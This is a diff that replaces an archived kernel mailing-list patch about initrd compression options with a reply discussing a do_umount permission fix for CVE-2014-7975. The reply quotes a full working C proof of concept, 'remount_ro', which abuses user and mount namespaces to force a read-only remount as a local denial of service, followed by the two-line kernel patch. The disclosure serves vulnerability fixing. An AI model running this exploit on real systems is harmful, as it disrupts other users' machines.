@@ -1,119 +1,187 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1757199AbaJIW3N (ORCPT <rfc822;w@1wt.eu>);
-	Thu, 9 Oct 2014 18:29:13 -0400
-Received: from mga11.intel.com ([192.55.52.93]:55135 "EHLO mga11.intel.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1755980AbaJIW3K (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Thu, 9 Oct 2014 18:29:10 -0400
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="5.04,688,1406617200"; 
-   d="scan'208";a="603055067"
-From: Andi Kleen <andi@firstfloor.org>
-To: linux-kernel@vger.kernel.org
-Cc: akpm@linux-foundation.org, Andi Kleen <ak@linux.intel.com>
-Subject: [PATCH] Make initrd compression algorithm selection not expert
-Date: Thu,  9 Oct 2014 15:29:07 -0700
-Message-Id: <1412893747-14542-1-git-send-email-andi@firstfloor.org>
-X-Mailer: git-send-email 1.9.3
+	id S1751696AbaJIWhF (ORCPT <rfc822;w@1wt.eu>);
+	Thu, 9 Oct 2014 18:37:05 -0400
+Received: from mail-la0-f42.google.com ([209.85.215.42]:34079 "EHLO
+	mail-la0-f42.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751254AbaJIWhA (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Thu, 9 Oct 2014 18:37:00 -0400
+MIME-Version: 1.0
+In-Reply-To: <a1480dcc3c706e309a88884723446f2e84fedd5b.1412796914.git.luto@amacapital.net>
+References: <a1480dcc3c706e309a88884723446f2e84fedd5b.1412796914.git.luto@amacapital.net>
+From: Andy Lutomirski <luto@amacapital.net>
+Date: Thu, 9 Oct 2014 15:36:37 -0700
+Message-ID: <CALCETrVRhm1u6LEFSwtjNj_y=u9SbWoOP9t82C0Yq1zeAmRLpg@mail.gmail.com>
+Subject: Re: [PATCH] fs: Add a missing permission check to do_umount
+To: Al Viro <viro@zeniv.linux.org.uk>,
+        "Eric W. Biederman" <ebiederm@xmission.com>,
+        "security@kernel.org" <security@kernel.org>
+Cc: Serge Hallyn <serge.hallyn@ubuntu.com>,
+        Andy Lutomirski <luto@amacapital.net>, stable <stable@vger.kernel.org>,
+        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
+        Linux FS Devel <linux-fsdevel@vger.kernel.org>
+Content-Type: text/plain; charset=UTF-8
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-From: Andi Kleen <ak@linux.intel.com>
+On Wed, Oct 8, 2014 at 12:37 PM, Andy Lutomirski <luto@amacapital.net> wrote:
+> Accessing do_remount_sb should require global CAP_SYS_ADMIN, but
+> only one of the two call sites was appropriately protected.
+>
+> Fixes CVE-2014-7975.
 
-The kernel has support for (nearly) every compression algorithm known to man,
-each to handle some particular microscopic niche.
+Due to my ineptitude, the cat is well and truly out of the bag on this
+one, complete with PoC.
 
-Unfortunately all of these always get compiled in if you want to support INITRDs,
-and can be only disabled when CONFIG_EXPERT is set.
+This fix really ought to be safe.  Inside a mountns owned by a
+non-root user namespace, the namespace root almost always has
+MNT_LOCKED set (if it doesn't, then there's a bug, because rootfs
+could be exposed).  In that case, calling umount on "/" will return
+-EINVAL with or without this patch.
 
-I don't see why I need to set EXPERT just to properly configure the
-initrd compression algorithms, and not always include every possible algorithm
+Outside a userns, this patch will have no effect.  may_mount, required
+by umount, already checks
+ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN), so an
+additional capable(CAP_SYS_ADMIN) check will have no effect.
 
-Usually the initrd is just compressed with gzip anyways, at least that's
-true on all distributions I use.
+That leaves anything that calls umount on "/" in a non-root userns
+while chrooted.  This is the case that is currently broken (it
+remounts ro, which shouldn't be allowed) and that my patch changes to
+-EPERM.  If anything relies on *that*, I'd be surprised.
 
-Remove the dependencies for initrd compression on CONFIG_EXPERT.
+--Andy
 
-Make the various options just default y, which should be good
-enough to not break any previous configuration.
+>
+> Cc: stable@vger.kernel.org
+> Signed-off-by: Andy Lutomirski <luto@amacapital.net>
+> ---
+>
+> *Sigh*
+>
+> Build the thing below and do something like:
+>
+> $ cd /dev/pts
+> $ remount_ro /dev
+>
+> /* remount_ro.c */
+> /* Copyright (c) 2014 Andrew Lutomirski.  All rights reserved. */
+>
+> #define _GNU_SOURCE
+> #include <unistd.h>
+> #include <sched.h>
+> #include <sys/types.h>
+> #include <sys/wait.h>
+> #include <fcntl.h>
+> #include <stdio.h>
+> #include <string.h>
+> #include <err.h>
+> #include <sys/mount.h>
+> #include <sys/syscall.h>
+> #include <sys/stat.h>
+>
+> #ifndef CLONE_NEWUSER
+> #define CLONE_NEWUSER 0x10000000
+> #endif
+>
+> static void set_map(const char *path, uid_t outer)
+> {
+>         char buf[1024];
+>         int fd = open(path, O_WRONLY);
+>         if (fd == -1)
+>                 err(1, "open map");
+>         sprintf(buf, "0 %ld 1", (long)outer);
+>         if (write(fd, buf, strlen(buf)) != strlen(buf))
+>                 err(1, "write map");
+>         close(fd);
+> }
+>
+> int main(int argc, char **argv)
+> {
+>   printf("remount_ro, a DoS by Andy Lutomirski\n");
+>   if (argc != 2) {
+>     printf("Usage: remount_ro TARGET_MOUNT\n");
+>     return 1;
+>   }
+>
+>   int origroot_fd;
+>   long uid = geteuid(), gid = getegid();
+>   char origcwd[16384];
+>   const char *target = argv[1];
+>
+>   if (unshare(CLONE_NEWUSER) != 0)
+>     err(1, "unshare(CLONE_NEWUSER)");
+>   if (unshare(CLONE_NEWNS) != 0)
+>     err(1, "unshare(CLONE_NEWNS)");
+>
+>   set_map("/proc/self/uid_map", uid);
+>   set_map("/proc/self/gid_map", gid);
+>
+>   if (mount("/", "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0)
+>     err(1, "MS_PRIVATE");
+>
+>   // Minimize required thought: just chroot to the target first.
+>   if (chroot(target) != 0)
+>     err(1, "chroot to target");
+>
+>   // Big song and dance to clear MNT_LOCKED on "/".
+>
+>   origroot_fd = open("/", O_RDONLY);
+>   if (origroot_fd == -1)
+>     err(1, "open");
+>
+>   if (!getcwd(origcwd, sizeof(origcwd)))
+>       err(1, "getcwd");
+>   if (!strncmp("(unreachable)", origcwd, 13))
+>     errx(1, "current directory must be under the target directory");
+>   if (!strcmp(origcwd, "/"))
+>     errx(1, "don't run from the target directory");
+>   if (mount("temporary_root", ".", "tmpfs", 0, NULL) != 0)
+>     err(1, "mount");
+>   if (chdir(origcwd) != 0)
+>     err(1, "chdir");
+>
+>   if (syscall(SYS_pivot_root, ".", ".") != 0)
+>     err(1, "pivot_root");
+>
+>   if (fchdir(origroot_fd) != 0)
+>     err(1, "fchdir");
+>   close(origroot_fd);
+>
+>   if (chroot(".") != 0)
+>     err(1, "chroot");
+>
+>   // That was fun.  Exploit time.
+>   if (umount2("/", MNT_FORCE) != 0)
+>     err(1, "umount");
+>   printf("Seems to have worked.  Have fun.\n");
+>
+>   return 0;
+> }
+>
+>  fs/namespace.c | 2 ++
+>  1 file changed, 2 insertions(+)
+>
+> diff --git a/fs/namespace.c b/fs/namespace.c
+> index ef42d9bee212..7f67b463a5b4 100644
+> --- a/fs/namespace.c
+> +++ b/fs/namespace.c
+> @@ -1356,6 +1356,8 @@ static int do_umount(struct mount *mnt, int flags)
+>                  * Special case for "unmounting" root ...
+>                  * we just try to remount it readonly.
+>                  */
+> +               if (!capable(CAP_SYS_ADMIN))
+> +                       return -EPERM;
+>                 down_write(&sb->s_umount);
+>                 if (!(sb->s_flags & MS_RDONLY))
+>                         retval = do_remount_sb(sb, MS_RDONLY, NULL, 0);
+> --
+> 1.9.3
+>
 
-Signed-off-by: Andi Kleen <ak@linux.intel.com>
----
- usr/Kconfig | 24 ++++++++++++------------
- 1 file changed, 12 insertions(+), 12 deletions(-)
 
-diff --git a/usr/Kconfig b/usr/Kconfig
-index 2d4c77e..572dcf7 100644
---- a/usr/Kconfig
-+++ b/usr/Kconfig
-@@ -46,17 +46,17 @@ config INITRAMFS_ROOT_GID
- 	  If you are not sure, leave it set to "0".
- 
- config RD_GZIP
--	bool "Support initial ramdisks compressed using gzip" if EXPERT
--	default y
-+	bool "Support initial ramdisks compressed using gzip"
- 	depends on BLK_DEV_INITRD
-+	default y
- 	select DECOMPRESS_GZIP
- 	help
- 	  Support loading of a gzip encoded initial ramdisk or cpio buffer.
- 	  If unsure, say Y.
- 
- config RD_BZIP2
--	bool "Support initial ramdisks compressed using bzip2" if EXPERT
--	default !EXPERT
-+	bool "Support initial ramdisks compressed using bzip2"
-+	default y
- 	depends on BLK_DEV_INITRD
- 	select DECOMPRESS_BZIP2
- 	help
-@@ -64,8 +64,8 @@ config RD_BZIP2
- 	  If unsure, say N.
- 
- config RD_LZMA
--	bool "Support initial ramdisks compressed using LZMA" if EXPERT
--	default !EXPERT
-+	bool "Support initial ramdisks compressed using LZMA"
-+	default y
- 	depends on BLK_DEV_INITRD
- 	select DECOMPRESS_LZMA
- 	help
-@@ -73,17 +73,17 @@ config RD_LZMA
- 	  If unsure, say N.
- 
- config RD_XZ
--	bool "Support initial ramdisks compressed using XZ" if EXPERT
--	default !EXPERT
-+	bool "Support initial ramdisks compressed using XZ"
- 	depends on BLK_DEV_INITRD
-+	default y
- 	select DECOMPRESS_XZ
- 	help
- 	  Support loading of a XZ encoded initial ramdisk or cpio buffer.
- 	  If unsure, say N.
- 
- config RD_LZO
--	bool "Support initial ramdisks compressed using LZO" if EXPERT
--	default !EXPERT
-+	bool "Support initial ramdisks compressed using LZO"
-+	default y
- 	depends on BLK_DEV_INITRD
- 	select DECOMPRESS_LZO
- 	help
-@@ -91,8 +91,8 @@ config RD_LZO
- 	  If unsure, say N.
- 
- config RD_LZ4
--	bool "Support initial ramdisks compressed using LZ4" if EXPERT
--	default !EXPERT
-+	bool "Support initial ramdisks compressed using LZ4"
-+	default y
- 	depends on BLK_DEV_INITRD
- 	select DECOMPRESS_LZ4
- 	help
+
 -- 
-1.9.3
-
+Andy Lutomirski
+AMA Capital Management, LLC
